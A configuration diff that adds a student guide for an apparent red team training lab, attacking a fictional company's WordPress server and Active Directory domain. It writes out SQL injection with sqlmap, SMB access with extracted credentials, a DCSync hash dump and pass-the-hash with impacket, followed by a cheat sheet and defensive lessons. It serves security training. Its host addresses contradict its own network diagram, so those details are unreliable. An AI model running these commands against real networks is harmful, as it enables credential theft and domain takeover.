@@ -111,6 +111,183 @@ router:
   enabled: true
   dhcp_enabled: false
 
+# Walkthrough/Student Guide
+walkthrough:
+  title: "Red Team Training Lab - Student Guide"
+  overview: |
+    Welcome to the Red Team Training Lab. You will play the role of a penetration tester
+    who has been hired to assess Acme Widgets' security posture. Your goal is to gain
+    Domain Admin access starting from a position outside the network.
+  objectives:
+    - Network reconnaissance and enumeration
+    - SQL injection attacks and credential extraction
+    - Cross-site scripting (XSS) and browser exploitation with BeEF
+    - Lateral movement using stolen credentials
+    - Active Directory attacks (DCSync)
+    - The importance of defense-in-depth
+  network_diagram: |
+    INTERNET (172.16.0.0/24)
+    +---------------------------+
+    |  kali (172.16.0.10)       |  <-- Your Attack Box
+    |  redir1 (172.16.0.20)     |
+    |  redir2 (172.16.0.21)     |
+    +---------------------------+
+                |
+    ============|============  (Router)
+                |
+    DMZ (172.16.1.0/24)
+    +-----------------------+
+    | webserver (172.16.1.10)|  <-- WordPress Target
+    +-----------------------+
+                |
+    ============|============  (Router)
+                |
+    INTERNAL (172.16.2.0/24)
+    +-----------------------+
+    | dc01 (172.16.2.10)     |  <-- Domain Controller
+    | fileserver (.2.20)     |  <-- SMB File Server
+    | ws01 (172.16.2.30)     |  <-- Employee Workstation
+    +-----------------------+
+  phases:
+    - id: recon
+      title: "Phase 1: Reconnaissance"
+      description: "Discover and enumerate the target network"
+      steps:
+        - id: recon-1
+          title: "Check your position"
+          content: |
+            First, understand your position in the network. Open a terminal on Kali.
+            ```bash
+            ip addr show eth0
+            ```
+            You should see 172.16.0.10 - you're on the "internet" network.
+        - id: recon-2
+          title: "Network Discovery"
+          content: |
+            Scan your network to find live hosts:
+            ```bash
+            nmap -sn 172.16.0.0/24
+            ```
+            You should find the webserver at 172.16.0.100.
+        - id: recon-3
+          title: "Service Enumeration"
+          content: |
+            Scan services on the webserver:
+            ```bash
+            nmap -sV -sC 172.16.0.100
+            ```
+            Expected: Port 80 (HTTP), Port 3306 (MySQL)
+    - id: sqli
+      title: "Phase 2: SQL Injection"
+      description: "Exploit the web application to extract credentials"
+      steps:
+        - id: sqli-1
+          title: "Web Enumeration"
+          content: |
+            Explore the web application:
+            ```bash
+            gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
+            ```
+            Look for /employee-directory/
+        - id: sqli-2
+          title: "Test for SQLi"
+          content: |
+            Test the search box for SQL injection:
+            ```bash
+            curl "http://172.16.0.100/employee-directory/?search='"
+            ```
+            An error indicates vulnerability.
+        - id: sqli-3
+          title: "Extract Credentials"
+          content: |
+            Use sqlmap to dump the database:
+            ```bash
+            sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress -T wp_acme_employees --dump --batch
+            ```
+            You'll find: svc_backup / Backup2024!
+    - id: lateral
+      title: "Phase 3: Lateral Movement"
+      description: "Use stolen credentials to access internal systems"
+      steps:
+        - id: lateral-1
+          title: "Test SMB Access"
+          content: |
+            Test credentials on the file server:
+            ```bash
+            smbclient -L //172.16.2.20 -U svc_backup%Backup2024!
+            ```
+        - id: lateral-2
+          title: "Access Sensitive Files"
+          content: |
+            Connect to the sensitive share:
+            ```bash
+            smbclient //172.16.2.20/sensitive -U svc_backup%Backup2024!
+            ```
+            Download and examine passwords.txt
+    - id: ad-attack
+      title: "Phase 4: Active Directory Attack"
+      description: "Compromise the domain using DCSync"
+      steps:
+        - id: ad-1
+          title: "DCSync Attack"
+          content: |
+            The svc_backup account has DCSync rights (misconfiguration):
+            ```bash
+            impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
+            ```
+            This extracts all domain password hashes.
+        - id: ad-2
+          title: "Pass-the-Hash"
+          content: |
+            Use the Administrator hash to get a shell:
+            ```bash
+            impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@172.16.2.10
+            ```
+            You now have Domain Admin access!
+    - id: post-exploit
+      title: "Phase 5: Post-Exploitation"
+      description: "Verify access and explore the domain"
+      steps:
+        - id: post-1
+          title: "Verify Access"
+          content: |
+            On the DC:
+            ```bash
+            whoami
+            whoami /groups
+            net group "Domain Admins" /domain
+            ```
+  defensive_lessons:
+    - vulnerability: "SQL Injection"
+      impact: "Credential theft"
+      mitigation: "Parameterized queries, input validation, WAF"
+    - vulnerability: "Plaintext passwords"
+      impact: "Direct credential exposure"
+      mitigation: "Hash passwords, use secrets manager"
+    - vulnerability: "Password reuse"
+      impact: "Lateral movement"
+      mitigation: "Unique passwords, password manager"
+    - vulnerability: "DCSync rights for service account"
+      impact: "Domain compromise"
+      mitigation: "Principle of least privilege"
+  quick_reference: |
+    # Network scanning
+    nmap -sn 172.16.1.0/24                    # Host discovery
+    nmap -sV -sC -p- <IP>                     # Full port scan
+
+    # SQL Injection
+    sqlmap -u "<URL>" --dbs                   # List databases
+    sqlmap -u "<URL>" -D <db> --tables        # List tables
+    sqlmap -u "<URL>" -D <db> -T <tbl> --dump # Dump table
+
+    # SMB
+    smbclient -L //<IP> -U <user>%<pass>      # List shares
+    smbclient //<IP>/<share> -U <user>%<pass> # Connect to share
+
+    # Active Directory
+    impacket-secretsdump '<domain>/<user>:<pass>@<DC>'    # DCSync
+    impacket-psexec -hashes <LM>:<NTLM> <user>@<IP>       # Pass-the-Hash
+
 # Training scenario events (MSEL)
 events:
   - sequence: 1
